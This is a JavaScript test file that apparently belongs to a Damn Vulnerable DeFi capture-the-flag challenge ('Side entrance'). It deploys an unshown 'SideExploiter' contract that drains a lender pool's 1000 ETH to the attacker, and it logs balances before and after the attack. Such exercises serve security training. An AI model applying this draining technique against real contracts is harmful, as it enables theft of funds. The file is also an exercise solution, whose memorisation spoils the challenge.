const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Side entrance", function () {
  let deployer, attacker;

  const ETHER_IN_POOL = ethers.utils.parseEther("1000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const SideEntranceLenderPoolFactory = await ethers.getContractFactory(
      "SideEntranceLenderPool",
      deployer
    );
    this.pool = await SideEntranceLenderPoolFactory.deploy();

    await this.pool.deposit({ value: ETHER_IN_POOL });

    this.attackerInitialEthBalance = await ethers.provider.getBalance(
      attacker.address
    );

    expect(await ethers.provider.getBalance(this.pool.address)).to.equal(
      ETHER_IN_POOL
    );
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    const Exploiter = await ethers.getContractFactory(
      "SideExploiter",
      attacker
    );
    this.exploiter = await Exploiter.deploy(this.pool.address);

    const poolBalanceBeforeExploit = await ethers.provider.getBalance(
      this.pool.address
    );
    console.log(`Pool balance before exploit: ${poolBalanceBeforeExploit}`);

    const exploiterBalanceBeforeExploit = await ethers.provider.getBalance(
      this.exploiter.address
    );
    console.log(
      `Exploiter balance before exploit: ${exploiterBalanceBeforeExploit}`
    );

    const attackerBalanceBeforeExploit = await ethers.provider.getBalance(
      attacker.address
    );
    console.log(
      `Attacker balance before exploit: ${attackerBalanceBeforeExploit}`
    );

    await this.exploiter.connect(attacker).exploit();

    const poolBalanceAfterExploit = await ethers.provider.getBalance(
      this.pool.address
    );
    console.log(`Pool balance after exploit: ${poolBalanceAfterExploit}`);

    const exploiterBalanceAfterExploit = await ethers.provider.getBalance(
      this.exploiter.address
    );
    console.log(
      `Exploiter balance after exploit: ${exploiterBalanceAfterExploit}`
    );

    const attackerBalanceAfterExploit = await ethers.provider.getBalance(
      attacker.address
    );
    console.log(
      `Attacker balance after exploit: ${attackerBalanceAfterExploit}`
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
      "0"
    );

    // Not checking exactly how much is the final balance of the attacker,
    // because it'll depend on how much gas the attacker spends in the attack
    // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
      this.attackerInitialEthBalance
    );
  });
});
